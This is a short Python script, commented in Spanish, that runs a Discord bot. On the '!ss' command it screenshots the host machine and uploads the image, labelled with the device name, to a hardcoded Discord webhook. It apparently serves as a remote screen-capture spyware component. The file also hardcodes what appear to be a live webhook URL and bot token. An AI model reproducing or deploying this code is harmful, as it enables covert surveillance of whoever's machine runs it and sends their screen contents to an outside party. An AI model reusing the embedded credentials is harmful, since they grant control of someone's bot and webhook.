import os
import platform
import pyautogui
import requests
import discord
from discord.ext import commands

# Configuración
WEBHOOK_URL = 'https://discord.com/api/webhooks/1257126509706084473/AooLjDJbUk7BbBi8HjROeV1E0_o-OsFe17j7rI7-cUOsqvVSX7R7CA_xTJk9oWxVXhym'
BOT_TOKEN = 'MTI1Njc0NjI2ODE2NDg4MjQ4Mw.GTw785.FJpayXg_RCozO6JsLP30UQ7RkmX2UPcgsTV2Kw'
COMMAND_PREFIX = '!'
DEVICE_NAME = platform.node()  # Obtiene el nombre del dispositivo

# Crear bot de Discord
bot = commands.Bot(command_prefix=COMMAND_PREFIX)

# Función para tomar captura de pantalla
def take_screenshot():
    screenshot_path = f'{DEVICE_NAME}_screenshot.png'
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path

# Enviar captura de pantalla a webhook
def send_screenshot_to_webhook(screenshot_path):
    with open(screenshot_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(WEBHOOK_URL, files=files, data={'content': f'Captura de pantalla tomada en {DEVICE_NAME}'})
    if response.status_code == 204:
        print('Captura de pantalla enviada con éxito.')
    else:
        print('Error al enviar la captura de pantalla.')

# Comando !ss para tomar y enviar captura de pantalla
@bot.command()
async def ss(ctx):
    try:
        screenshot_path = take_screenshot()
        send_screenshot_to_webhook(screenshot_path)
        await ctx.send(f'Captura de pantalla tomada en {DEVICE_NAME} y enviada al webhook.')
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f'Error al tomar o enviar la captura de pantalla: {e}')

# Ejecutar el bot
bot.run(BOT_TOKEN)
